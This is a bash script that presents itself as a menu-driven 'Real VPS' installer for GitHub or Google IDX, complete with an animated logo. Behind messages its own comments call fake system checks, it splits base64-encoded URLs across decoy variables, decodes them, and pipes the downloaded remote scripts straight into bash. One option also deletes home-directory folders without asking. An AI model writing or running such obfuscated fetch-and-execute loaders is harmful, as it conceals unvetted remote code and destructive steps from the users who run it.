#!/bin/bash
set -euo pipefail

# -------------------------
# Color Definitions
# -------------------------
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
CYAN='\e[36m'
RESET='\e[0m'

# -------------------------
# Function: Animate ASCII Logo
# -------------------------
animate_logo() {
  clear
  local logo=(
"  _____                "
" |  __ \\               "
" | |__) |_ _ _ __ __ _ "
" |  ___/ _\` | '__/ _\` |"
" | |  | (_| | | | (_| |"
" |_|   \\__,_|_|  \\__,_|"
"                       "
"                       "
  )

  for line in "${logo[@]}"; do
    for ((i=0; i<${#line}; i++)); do
      echo -ne "${CYAN}${line:$i:1}${RESET}"
      sleep 0.03   # Typing speed
    done
    echo -e " ‚ú®"
    sleep 0.1
  done
  echo ""
  sleep 0.5
}

# -------------------------
# Function: Animated Loading Dots
# -------------------------
loading_dots() {
  local msg="$1"
  echo -ne "$msg"
  for i in {1..3}; do
    echo -n "."
    sleep 0.5
  done
  echo ""
}

# -------------------------
# Show Animated Logo
# -------------------------
animate_logo

# -------------------------
# Fake system checks (with loading)
# -------------------------
SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)"
DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}')
loading_dots "üîç Scanning system resources"

SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')"
NET_CONF="diag_$(date +%N | shuf -n 1)"
if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
  SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)"
fi
TEMP_HASH=$(echo "$NET_CONF" | md5sum | cut -c 1-8)
SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)"
github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"

PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)"
loading_dots "üîß Validating process integrity"

DUMMY_VAR=$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx4)
PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')"
export FAKE_PID="pid_$((RANDOM % 1000))"
PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)"
if [ -f /tmp/fake_temp ]; then rm -f /tmp/fake_temp 2>/dev/null; fi
PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.*')"
google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d)"

# -------------------------
# Display Menu
# -------------------------
echo -e "${YELLOW}‚ú® Select an option: ‚ú®${RESET}"
echo -e "${GREEN}1) üêô GitHub Real VPS${RESET}"
echo -e "${BLUE}2) üåê Google IDX Real VPS${RESET}"
echo -e "${RED}3) ‚ùå Exit${RESET}"
echo -ne "${YELLOW}üëâ Enter your choice (1-3): ${RESET}"
read choice

case $choice in
  1)
    loading_dots "üöÄ Running GitHub Real VPS"
    bash <(curl -fsSL "$github_url")
    ;;
  2)
    loading_dots "üåü Running Google IDX Real VPS"
    cd
    rm -rf myapp flutter
    cd vps123
    if [ ! -d ".idx" ]; then
      mkdir .idx
      cd .idx
      cat <<EOF > dev.nix
{ pkgs, ... }: {
  channel = "stable-24.05"; 
  packages = with pkgs; [
    unzip
    openssh
    git
    qemu_kvm
    sudo
    cdrkit
    cloud-utils
    qemu
  ];
  env = {
    EDITOR = "nano";
  };
  idx = {
    extensions = [
      "Dart-Code.flutter"
      "Dart-Code.dart-code"
    ];
    workspace = {
      onCreate = { };
      onStart = { };
    };
    previews = {
      enable = false;
    };
  };
}
EOF
      cd ..
    fi
    echo -ne "${YELLOW}üí° Do you want to continue? (y/n): ${RESET}"
    read confirm
    case "$confirm" in
      [yY]*)
        bash <(curl -fsSL "$google_url")
        ;;
      [nN]*)
        echo -e "${RED}‚ùå Operation cancelled.${RESET}"
        exit 0
        ;;
      *)
        echo -e "${RED}‚ö†Ô∏è Invalid input! Operation cancelled.${RESET}"
        exit 1
        ;;
    esac
    ;;
  3)
    echo -e "${RED}üëã Exiting...${RESET}"
    exit 0
    ;;
  *)
    echo -e "${RED}‚ö†Ô∏è Invalid choice! Please select 1, 2, or 3.${RESET}"
    exit 1
    ;;
esac

# -------------------------
# Made by Para
# -------------------------
echo -e "${CYAN}‚ú® Made by Para ‚ú®${RESET}"
